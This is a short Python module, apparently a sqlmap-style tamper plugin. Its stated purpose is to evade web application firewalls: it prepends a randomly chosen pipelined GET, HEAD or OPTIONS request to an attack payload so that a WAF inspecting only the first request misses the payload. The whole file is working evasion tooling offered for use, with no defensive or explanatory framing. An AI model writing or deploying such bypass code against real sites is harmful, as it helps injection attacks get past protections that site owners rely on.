import random

__example_payload__ = "GET / HTTP/1.1\r\nHost: target.com"
__type__ = "HTTP pipeline fragmentation: splits payload across pipelined requests to bypass request-level WAF"


def tamper(payload, **kwargs):
    if not payload:
        return payload

    # HTTP request pipeline: multiple requests in one connection
    # Some WAFs only inspect the first request
    pipeline_prefixes = [
        "GET / HTTP/1.1\r\nHost: localhost\r\n\r\n",
        "HEAD / HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n",
        "OPTIONS / HTTP/1.1\r\nHost: example.com\r\n\r\n",
    ]

    prefix = random.choice(pipeline_prefixes)
    return "{}{}".format(prefix, payload)
